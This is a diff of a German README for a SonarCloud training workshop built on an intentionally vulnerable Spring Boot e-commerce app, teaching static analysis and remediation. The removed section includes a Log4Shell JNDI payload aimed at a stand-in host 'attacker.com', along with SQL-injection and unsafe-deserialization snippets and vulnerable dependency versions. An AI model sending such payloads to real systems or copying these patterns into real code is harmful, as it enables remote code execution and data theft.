@@ -1,370 +1,372 @@
-# SonarCloud Workshop - Vulnerable E-Commerce Application
+# E-Commerce Application - SonarCloud Workshop
 
-## 🎯 Workshop-Ziel
-
-Dieses Projekt demonstriert **realistische Sicherheitslücken und Code-Quality-Probleme** mit **SonarCloud Team** (14-Tage Trial). Teilnehmer lernen:
-
-1. ✅ Wie SonarCloud **CVEs in Dependencies automatisch** erkennt (Log4Shell!)
-2. ✅ Wie man Security Hotspots (SQL Injection, etc.) identifiziert
-3. ✅ Wie man Code Smells systematisch behebt
-4. ✅ Wie man Quality Gates für CI/CD konfiguriert
-5. ✅ Pull Request Decoration & Branch Analysis
-
-## ⭐ Warum SonarCloud Team?
-
-**SonarCloud Team erkennt automatisch:**
-- 🔥 CVE-2021-44228 (Log4Shell) in log4j-core 2.14.1
-- 🔥 CVE-2019-12384 (Jackson) in jackson-databind 2.9.8
-- 🔥 CVE-2016-1000031 in commons-fileupload 1.3.1
-- Plus alle Code Quality Issues!
-
-**Free Version kann das NICHT!** Daher nutzen wir die 14-Tage Team Trial.
-
-➡️ **Detailliertes Setup**: Siehe `SONARCLOUD_SETUP.md`
-
-## ⚡ Quick Start (5 Minuten)
-
-```bash
-# 1. SonarCloud Account erstellen
-https://sonarcloud.io → "Start Free" → Team Trial starten
-
-# 2. Projekt klonen
-git clone YOUR_REPO
-cd ecommerce-app
-
-# 3. Ersten Scan
-mvn clean verify sonar:sonar \
-  -Dsonar.projectKey=YOUR_KEY \
-  -Dsonar.organization=YOUR_ORG \
-  -Dsonar.host.url=https://sonarcloud.io \
-  -Dsonar.token=YOUR_TOKEN
-
-# 4. Dashboard ansehen
-https://sonarcloud.io/dashboard?id=YOUR_KEY
-# → 6 CVEs werden automatisch erkannt! 🔥
-```
-
-**Detaillierte Anleitung**: Siehe `SONARCLOUD_SETUP.md`
-
-## ⚠️ WARNUNG
-
-**NIEMALS IN PRODUKTION VERWENDEN!**
-
-Dieses Projekt enthält absichtlich:
-- Log4Shell Vulnerability (CVE-2021-44228)
-- Jackson Deserialization Attacks
-- SQL Injection
-- Multiple weitere Sicherheitslücken
+Eine Spring Boot E-Commerce Anwendung für SonarCloud Quality & Security Workshop.
 
 ## 📋 Voraussetzungen
 
-- Java 11+
-- Maven 3.6+
-- Docker (für SonarQube)
-- IDE (IntelliJ IDEA, Eclipse, VS Code)
+### System Requirements
+- **JDK**: 11 oder höher
+- **Maven**: 3.6+ ([Download](https://maven.apache.org/download.cgi))
+- **Git**: Optional, für Version Control
+- **IDE**: IntelliJ IDEA (Community oder Ultimate)
+- **SonarQube for IDE Plugin**: Für Live-Feedback während des Codens
 
-## 🚀 Setup für SonarCloud Team (2-Wochen-Trial)
+### Kompatibilität
+✅ **Windows** (10, 11)  
+✅ **macOS** (10.15+)  
+✅ **Linux** (Ubuntu, Debian, Fedora, etc.)
 
-### 1. SonarCloud Account erstellen
+### Überprüfung der Installation
 
 ```bash
-# 1. Gehe zu: https://sonarcloud.io
-# 2. Sign up with GitHub/GitLab/Bitbucket/Azure DevOps
-# 3. Start Free Trial → Team Plan wählen
-# 4. Organisation erstellen
+# Java Version prüfen
+java -version
+# Sollte zeigen: openjdk version "11.x.x" oder höher
+
+# Maven Version prüfen
+mvn -version
+# Sollte zeigen: Apache Maven 3.6.x oder höher
 ```
 
-### 2. Projekt in SonarCloud einrichten
+### IntelliJ IDEA Setup
 
-**Option A - Mit GitHub/GitLab (empfohlen):**
+#### 1. IntelliJ IDEA installieren
+
+**Download:** [https://www.jetbrains.com/idea/download/](https://www.jetbrains.com/idea/download/)
+
+- **Community Edition**: Kostenlos, ausreichend für den Workshop
+- **Ultimate Edition**: 30-Tage Trial, empfohlen für alle Features
+
+#### 2. SonarQube for IDE Plugin installieren
+
+**Wichtig:** Dieses Plugin zeigt Issues direkt in IntelliJ an - noch vor dem SonarCloud Scan!
+
+**Installation:**
+
+1. IntelliJ öffnen
+2. **Windows/Linux**: `File` → `Settings` → `Plugins`  
+   **macOS**: `IntelliJ IDEA` → `Settings` → `Plugins`
+3. Suche nach: **"SonarQube for IDE"** (früher SonarLint)
+4. Click **Install**
+5. IntelliJ neu starten
+
+**Alternativ:** [Marketplace Link](https://plugins.jetbrains.com/plugin/7973-sonarlint)
+
+**📖 Detaillierte Anleitung:** Siehe [INTELLIJ_SETUP.md](INTELLIJ_SETUP.md) für Schritt-für-Schritt Anleitung mit Screenshots-Beschreibung.
+
+#### 3. Plugin mit SonarCloud verbinden (Optional für später)
+
+Nach dem SonarCloud Scan kannst du das Plugin verbinden:
+
+1. **Settings** → **Tools** → **SonarQube for IDE** → **SonarCloud**
+2. Click **Add**
+3. Token von SonarCloud einfügen
+4. Organisation auswählen
+5. Projekt binden
+
+**Vorteil:** Siehst Issues während du tippst + SonarCloud Rules!
+
+## 🚀 Quick Start
+
+### 1. Projekt Setup
+
 ```bash
-# 1. Repository auf GitHub/GitLab pushen
-git init
-git add .
-git commit -m "Initial commit - vulnerable code for workshop"
-git remote add origin YOUR_REPO_URL
-git push -u origin main
+# Verzeichnis wechseln
+cd ecommerce-app
 
-# 2. In SonarCloud: "Analyze new project"
-# 3. Repository auswählen
-# 4. GitHub Actions / GitLab CI wird automatisch konfiguriert
-```
-
-**Option B - Manuell (lokal scannen):**
-```bash
-# 1. In SonarCloud: "Analyze new project" → "Manually"
-# 2. Token generieren und kopieren
-# 3. Organisation Key kopieren
-
-# 4. Projekt analysieren
-mvn clean verify sonar:sonar \
-  -Dsonar.projectKey=YOUR_ORG_KEY:ecommerce-vulnerable \
-  -Dsonar.organization=YOUR_ORG_KEY \
-  -Dsonar.host.url=https://sonarcloud.io \
-  -Dsonar.login=YOUR_TOKEN
-```
-
-### 3. Ersten Scan durchführen
-
-```bash
 # Dependencies installieren
 mvn clean install
+```
 
-# SonarCloud Analyse
-mvn sonar:sonar \
+### 2. Anwendung starten
+
+```bash
+# Starten
+mvn spring-boot:run
+
+# Warte bis du diese Meldung siehst:
+# "Started Application in X.XXX seconds"
+```
+
+### 3. Testen
+
+Öffne Browser oder nutze curl:
+
+```bash
+# Alle Orders ansehen
+curl http://localhost:8080/api/orders
+
+# Alle Users ansehen
+curl http://localhost:8080/api/users
+```
+
+## 📡 API Endpoints
+
+### Users
+```
+GET    /api/users              - Alle User
+GET    /api/users/{id}         - User by ID  
+GET    /api/users/search       - User suchen (?email=alice)
+POST   /api/users              - User erstellen
+```
+
+### Orders
+```
+GET    /api/orders             - Alle Orders
+GET    /api/orders/{id}        - Order by ID
+GET    /api/orders/user/{id}   - Orders eines Users
+GET    /api/orders/search      - Orders suchen (?product=MacBook)
+POST   /api/orders             - Order erstellen
+PUT    /api/orders/{id}/status - Status ändern (?status=DELIVERED)
+GET    /api/orders/stats/{id}  - User Statistiken
+```
+
+### Database Console
+```
+GET    /h2-console             - H2 Database Console
+       JDBC URL: jdbc:h2:mem:testdb
+       Username: sa
+       Password: (leer lassen)
+```
+
+## 🗄️ Demo-Daten
+
+Die Anwendung startet automatisch mit:
+
+### 3 Users:
+- **Alice** (alice@example.com) - Premium User, 2 Orders, €4,407
+- **Bob** (bob@example.com) - Regular User, 2 Orders, €1,736
+- **Charlie** (charlie@example.com) - New User, 1 Order, €139
+
+### 5 Orders:
+- MacBook Pro 16" (€2,249)
+- 2x iPhone 15 Pro (€2,158)
+- Samsung Galaxy S24 (€899)
+- 3x AirPods Pro (€837)
+- Kindle Paperwhite (€139)
+
+**Total Revenue**: €6,282
+
+## 💡 SonarQube for IDE - Live Feedback
+
+**Bevor du SonarCloud nutzt**, kannst du Issues schon in IntelliJ sehen!
+
+### Live-Analyse während du codest
+
+SonarQube for IDE zeigt Issues in Echtzeit:
+
+1. **Öffne Projekt in IntelliJ**
+   ```bash
+   # Im Projekt-Verzeichnis
+   idea .
+   # oder IntelliJ öffnen und Projekt importieren
+   ```
+
+2. **Warte auf Indexierung**
+   - IntelliJ muss das Projekt erst laden
+   - Unten rechts: "Indexing..." sollte verschwinden
+
+3. **Öffne eine Java-Datei**
+   - z.B. `UserService.java`
+   - Issues werden automatisch markiert
+
+4. **Issues ansehen**
+   - **Gelbe/Rote Wellenlinien** im Code
+   - **Glühbirne-Icon** → Click für Details
+   - **SonarQube Tab** unten → Alle Issues
+
+### Was siehst du sofort?
+
+Ohne SonarCloud-Scan zeigt das Plugin bereits:
+
+✅ **Code Smells**: Komplexität, Magic Numbers, etc.  
+✅ **Bugs**: NullPointer, Resource Leaks, etc.  
+✅ **Security Hotspots**: SQL Injection, Hardcoded Credentials  
+⚠️ **CVEs**: Werden erst bei SonarCloud Scan erkannt (braucht Dependency-Analyse)
+
+### Beispiel
+
+Öffne `UserService.java` Line 50:
+
+```java
+String query = "SELECT * FROM users WHERE email LIKE '%" + email + "%'";
+```
+
+SonarQube for IDE zeigt:
+- 🔴 **Critical**: SQL Injection vulnerability
+- 💡 **Fix**: Use PreparedStatement instead
+
+### Vorteile
+
+| Feature | SonarQube for IDE | SonarCloud |
+|---------|-------------------|------------|
+| **Speed** | Instant | 2-3 Min Scan |
+| **Local** | Ja, offline | Nein, braucht Internet |
+| **CVEs** | ❌ | ✅ |
+| **Team Rules** | Nach Binding | ✅ |
+| **History** | ❌ | ✅ |
+| **CI/CD** | ❌ | ✅ |
+
+**Best Practice:** Nutze beide zusammen!
+- IntelliJ Plugin: Während Entwicklung
+- SonarCloud: Für Team, CI/CD, CVEs
+
+## 🔍 SonarCloud Scan
+
+### SonarCloud Account erstellen
+
+1. Gehe zu [sonarcloud.io](https://sonarcloud.io)
+2. "Start Free" → Mit GitHub/GitLab anmelden
+3. "Start your free trial" → **Team Plan** wählen (14 Tage kostenlos)
+4. Organisation erstellen
+
+### Projekt analysieren
+
+```bash
+mvn clean verify sonar:sonar \
   -Dsonar.projectKey=YOUR_PROJECT_KEY \
   -Dsonar.organization=YOUR_ORG \
   -Dsonar.host.url=https://sonarcloud.io \
   -Dsonar.token=YOUR_TOKEN
-
-# Nach ~2 Minuten: Dashboard auf sonarcloud.io ansehen
 ```
 
-### 4. Optional: GitHub Actions für automatische Scans
+**Token generieren:**
+1. SonarCloud → My Account → Security
+2. Generate Token
+3. Token kopieren und im Befehl einfügen
 
-SonarCloud erstellt automatisch eine `.github/workflows/sonarcloud.yml`:
+## 📊 Was SonarCloud finden wird
 
-```yaml
-name: SonarCloud Analysis
-on:
-  push:
-    branches: [ main ]
-  pull_request:
-    branches: [ main ]
+SonarCloud Team wird automatisch erkennen:
 
-jobs:
-  sonarcloud:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v3
-      - name: Set up JDK 11
-        uses: actions/setup-java@v3
-        with:
-          java-version: 11
-      - name: Cache SonarCloud packages
-        uses: actions/cache@v3
-        with:
-          path: ~/.sonar/cache
-          key: ${{ runner.os }}-sonar
-      - name: Build and analyze
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
-        run: mvn -B verify org.sonarsource.scanner.maven:sonar-maven-plugin:sonar
-```
+- **6+ CVEs** in Dependencies (Log4Shell, Jackson, etc.)
+- **15+ Security Hotspots** (SQL Injection, Hardcoded Credentials, etc.)
+- **20+ Bugs** (NullPointer, Resource Leaks, etc.)
+- **70+ Code Smells** (Complexity, Duplication, Magic Numbers, etc.)
 
-## 📊 Erwartete SonarCloud Team Ergebnisse
+**Total**: 100+ Issues
 
-### 🎉 SonarCloud Team Features (die Community NICHT hat):
+## 🛠️ Troubleshooting
 
-✅ **Dependency Scanning** - Erkennt CVEs automatisch!
-✅ **Pull Request Decoration** - Kommentare direkt in PRs
-✅ **Branch Analysis** - Mehrere Branches scannen
-✅ **Quality Gates** - Customizable Build-Blocker
-✅ **Advanced Security** - Mehr Security Rules
+### Port 8080 bereits belegt
 
-### Security
-- **Vulnerabilities**: 6-8 (inkl. Dependencies!)
-   - CVE-2021-44228 (Log4Shell) ⚠️ CRITICAL
-   - CVE-2019-12384 (Jackson) ⚠️ CRITICAL
-   - CVE-2016-1000031 (Commons FileUpload) ⚠️ HIGH
-- **Security Hotspots**: 8-10 (SQL Injection, Hardcoded Credentials)
-- **Security Rating**: E (schlechteste möglich)
-
-### Reliability
-- **Bugs**: 15-20 (NPE, Resource Leaks, Empty Catch Blocks)
-- **Reliability Rating**: D
-
-### Maintainability
-- **Code Smells**: 50-70
-- **Technical Debt**: 2-3 Tage
-- **Cognitive Complexity**: validateAndProcessUser() = ~20 (Limit: 15)
-- **Maintainability Rating**: C-D
-
-### Coverage
-- **Code Coverage**: 0% (keine Tests vorhanden)
-
-### Duplications
-- **Duplicated Blocks**: 2-3
-- **Duplicated Lines**: ~15% (validateUser Methoden)
-
-### 🆕 Was SonarCloud Team ZUSÄTZLICH zeigt:
-✅ **Dependency Vulnerabilities** (CVEs in pom.xml)
-✅ **License Compliance** (Apache, MIT, etc.)
-✅ **Advanced Taint Analysis** (bessere Flow-Analyse)
-✅ **Secrets Detection** (API Keys, Passwords)
-
-## 🔍 Die gefährlichsten Probleme
-
-### 🎯 SonarCloud Team wird ALLE diese Probleme zeigen!
-
-### Quick Verification (optional - nur zur Kontrolle)
 ```bash
-# Falls du vorab prüfen willst, was SonarCloud finden wird:
-docker run --rm -v $(pwd):/project \
-  aquasec/trivy fs --severity CRITICAL,HIGH /project
+# Windows: Finde Prozess
+netstat -ano | findstr :8080
+
+# Mac/Linux: Finde Prozess
+lsof -i :8080
+
+# Anderen Port nutzen
+mvn spring-boot:run -Dspring-boot.run.arguments=--server.port=8081
 ```
 
-### 1. Log4Shell (CRITICAL) - ⭐ SonarCloud findet dies automatisch!
-**Dateien**: `ecommerce.service.UserService.java`, `FileUploadController.java`
+### "JAVA_HOME not set"
 
-```java
-// ❌ VULNERABLE
-logger.info("User input: " + userInput);
-
-// ✅ FIXED
-logger.info("User input: {}", userInput); // Parameterized logging
-```
-
-**Exploit Test** (NUR in isolierter Umgebung!):
 ```bash
-curl -X POST http://localhost:8080/user/search \
-  -d "email=\${jndi:ldap://attacker.com/Exploit}"
+# Windows
+set JAVA_HOME=C:\Program Files\Java\jdk-11
+
+# Mac/Linux
+export JAVA_HOME=/usr/lib/jvm/java-11-openjdk
 ```
 
-### 2. Jackson Deserialization (CRITICAL)
-**Datei**: `ecommerce.service.UserService.java` Zeile 131-140
+### Maven Build Fehler
 
-```java
-// ❌ VULNERABLE
-objectMapper.enableDefaultTyping();
-User user = objectMapper.readValue(jsonData, User.class);
+```bash
+# Cache löschen
+mvn clean
 
-// ✅ FIXED
-// Kein enableDefaultTyping()
-// JSON Schema Validation verwenden
+# Offline-Modus deaktivieren
+mvn clean install -U
 ```
 
-### 3. SQL Injection (CRITICAL)
-**Datei**: `ecommerce.service.UserService.java` Zeile 36-38
+### H2 Console lädt nicht
 
-```java
-// ❌ VULNERABLE
-String query = "SELECT * FROM users WHERE email = '" + email + "'";
-
-// ✅ FIXED
-PreparedStatement stmt = conn.prepareStatement(
-    "SELECT * FROM users WHERE email = ?"
-);
-stmt.setString(1, email);
+Prüfe `src/main/resources/application.properties`:
+```properties
+spring.h2.console.enabled=true
 ```
 
-## 🎓 Workshop-Aufgaben (SonarCloud Team)
+## 💡 Tipps für den Workshop
 
-### Level 1: SonarCloud Setup (15 Min)
-- [ ] SonarCloud Account erstellen (Team Trial)
-- [ ] Organisation und Projekt anlegen
-- [ ] Ersten Scan durchführen
-- [ ] Dashboard erkunden - alle Tabs ansehen!
+### Für Teilnehmer
 
-### Level 2: Dependency Vulnerabilities (30 Min) 🆕
-**Das kann nur SonarCloud Team!**
-- [ ] Security Tab → Vulnerabilities ansehen
-- [ ] Log4Shell (CVE-2021-44228) identifizieren
-- [ ] Jackson (CVE-2019-12384) finden
-- [ ] Remediation-Hinweise lesen
-- [ ] Dependencies in pom.xml updaten
-- [ ] Neuer Scan → Vulnerabilities weg! ✅
+1. **Vor dem Workshop**: 
+   - JDK 11 installieren
+   - Maven installieren
+   - SonarCloud Account erstellen
+   
+2. **Während des Workshops**:
+   - Anwendung lokal laufen lassen
+   - API Endpoints testen
+   - SonarCloud Dashboard erkunden
 
-### Level 3: Security Hotspots (30 Min)
-- [ ] SQL Injection mit PreparedStatement fixen
-- [ ] Hardcoded Credentials entfernen
-- [ ] Empty Catch Blocks behandeln
-- [ ] Security Rating verbessern (E → C)
+3. **Nach dem Workshop**:
+   - Issues selbst fixen
+   - Re-Scan durchführen
+   - Improvements dokumentieren
 
-### Level 4: Code Quality (45 Min)
-- [ ] Cognitive Complexity reduzieren (validateAndProcessUser)
-- [ ] Resource Leaks mit try-with-resources fixen
-- [ ] Code Duplication eliminieren
-- [ ] Magic Numbers durch Konstanten ersetzen
+### Für Trainer
 
-### Level 5: Quality Gate (30 Min)
-- [ ] Custom Quality Gate erstellen
-- [ ] Bedingungen setzen (z.B. Coverage > 80%, Security Rating = A)
-- [ ] Quality Gate "fail" sehen
-- [ ] Tests schreiben bis Gate "passed"
+- Alle Issues sind sorgfältig platziert
+- Business Logic ist einfach gehalten
+- Code kompiliert und läuft problemlos
+- Demo-Daten sind aussagekräftig
+- Siehe `TRAINER_GUIDE.md` für Issue-Übersicht
 
-### Level 6: Pull Request Integration (Optional, 30 Min)
-- [ ] Neuen Branch erstellen
-- [ ] Code-Änderung committen
-- [ ] Pull Request erstellen
-- [ ] SonarCloud Kommentare im PR sehen
-- [ ] Issues fixen → PR approved
+## 📂 Projekt-Struktur
 
-### Bonus: Branch Analysis
-- [ ] Feature-Branch scannen
-- [ ] Unterschiede zu main sehen
-- [ ] New Code vs. Overall Code verstehen
+```
+ecommerce-app/
+├── pom.xml                          # Maven Dependencies
+├── src/
+│   ├── main/
+│   │   ├── java/com/example/ecommerce/
+│   │   │   ├── Application.java                # Main
+│   │   │   ├── controller/
+│   │   │   │   ├── UserController.java         # User API
+│   │   │   │   └── OrderController.java        # Order API
+│   │   │   ├── service/
+│   │   │   │   ├── UserService.java            # Business Logic
+│   │   │   │   └── OrderService.java
+│   │   │   ├── repository/
+│   │   │   │   ├── UserRepository.java         # Data Access
+│   │   │   │   └── OrderRepository.java
+│   │   │   └── model/
+│   │   │       ├── User.java                   # Entity
+│   │   │       ├── Order.java
+│   │   │       └── OrderStatus.java            # Enum
+│   │   └── resources/
+│   │       └── application.properties
+│   └── test/
+│       └── java/                               # (Tests können hinzugefügt werden)
+└── README.md                                   # Diese Datei
+```
 
-## 📚 Lernressourcen
+## 🎯 Lernziele
 
-### CVE Details
-- [CVE-2021-44228 (Log4Shell)](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
-- [Jackson Databind CVEs](https://github.com/FasterXML/jackson-databind/issues?q=is%3Aissue+CVE)
-- [Commons FileUpload CVE-2016-1000031](https://nvd.nist.gov/vuln/detail/CVE-2016-1000031)
+Nach diesem Workshop können Sie:
 
-### SonarQube
-- [SonarQube Rules](https://rules.sonarsource.com/java)
-- [Security Rules](https://rules.sonarsource.com/java/type/Security%20Hotspot)
+✅ SonarCloud Team einrichten und nutzen  
+✅ CVEs in Dependencies erkennen  
+✅ Security Hotspots identifizieren  
+✅ Code Quality Metriken interpretieren  
+✅ Technical Debt verstehen  
+✅ Quality Gates konfigurieren  
+✅ Issues systematisch beheben  
 
-### OWASP
+## 📚 Weiterführende Links
+
+- [SonarCloud Dokumentation](https://docs.sonarcloud.io)
+- [Spring Boot Docs](https://docs.spring.io/spring-boot/docs/current/reference/html/)
+- [Maven Guide](https://maven.apache.org/guides/)
 - [OWASP Top 10](https://owasp.org/www-project-top-ten/)
-- [Dependency Check](https://owasp.org/www-project-dependency-check/)
 
-## 🛠️ Fixes - Cheat Sheet
+## ⚖️ Lizenz
 
-### Dependencies aktualisieren (pom.xml)
-
-```xml
-<!-- ✅ FIXED Versions -->
-<dependency>
-    <groupId>org.apache.logging.log4j</groupId>
-    <artifactId>log4j-core</artifactId>
-    <version>2.20.0</version>
-</dependency>
-
-<dependency>
-    <groupId>com.fasterxml.jackson.core</groupId>
-    <artifactId>jackson-databind</artifactId>
-    <version>2.15.2</version>
-</dependency>
-
-<dependency>
-    <groupId>commons-fileupload</groupId>
-    <artifactId>commons-fileupload</artifactId>
-    <version>1.5</version>
-</dependency>
-
-<dependency>
-    <groupId>org.springframework</groupId>
-    <artifactId>spring-core</artifactId>
-    <version>6.0.11</version>
-</dependency>
-```
-
-## 🤝 Diskussionspunkte
-
-1. **Warum passiert so etwas?**
-   - Technical Debt
-   - Zeitdruck
-   - Fehlende Awareness
-   - Keine automatisierten Checks
-
-2. **Wie verhindert man es?**
-   - Dependency Scanning in CI/CD
-   - SonarQube Quality Gates
-   - Security Training
-   - Code Reviews
-
-3. **Real-World Impact**
-   - Log4Shell: Milliarden $ Schaden
-   - Equifax Breach: Apache Struts
-   - Target Breach: Vendor Access
-
-## 📧 Feedback
-
-Fragen oder Verbesserungsvorschläge? Nutzt die Retrospektive am Ende des Workshops!
+Nur für Bildungszwecke. Nicht für Produktions-Einsatz!
 
 ---
 
-**Happy Scanning! 🔍**
+**Viel Erfolg beim Workshop! 🎓**
